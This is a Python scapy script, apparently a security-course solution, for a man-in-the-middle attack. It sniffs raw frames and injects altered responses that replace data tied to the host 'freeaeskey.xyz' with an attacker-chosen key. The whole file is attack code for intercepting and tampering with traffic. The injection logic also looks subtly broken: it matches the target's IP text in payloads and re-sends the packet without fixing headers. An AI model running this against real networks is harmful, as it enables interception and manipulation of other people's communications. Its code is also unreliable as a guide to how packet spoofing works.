from scapy.all import send, conf, L3RawSocket
from scapy.all import TCP, IP, Ether, Raw
import socket

# Use this function to send packets
def inject_pkt(pkt):
    conf.L3socket = L3RawSocket
    send(pkt)

# Known Key used in MIM attack
modifiedKey = b"4d6167696320576f7264733a2053717565616d697368204f7373696672616765"

# Resolve the target hostname to an IP address
targetHost = "freeaeskey.xyz"

try:
    targetIP = socket.gethostbyname(targetHost)
except socket.gaierror:
    print(f"Failed to resolve {targetHost}")
    targetIP = None

# Use the resolved IP address as the target
target = targetIP 


def handle_pkt(pkt):
    ethPacket = Ether(pkt)
    
    # Check if the packet contains IP and TCP layers
    if IP in ethPacket and TCP in ethPacket:
        ip_packet = ethPacket[IP]
        tcp_packet = ethPacket[TCP]

        # Check if the packet contains a Raw layer with payload
        if Raw in ethPacket:
            data = ethPacket[Raw].load

            # Intercept the request and modify the response
            if target and target.encode() in data:
                modified_data = data.replace(target.encode(), modifiedKey)
                new_packet = ethPacket
                new_packet[Raw].load = modified_data

                # Send the modified response
                inject_pkt(new_packet)

def main():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0x0300)

    while True:
        pkt = s.recv(0xffff)
        handle_pkt(pkt)

if __name__ == '__main__':
    main()
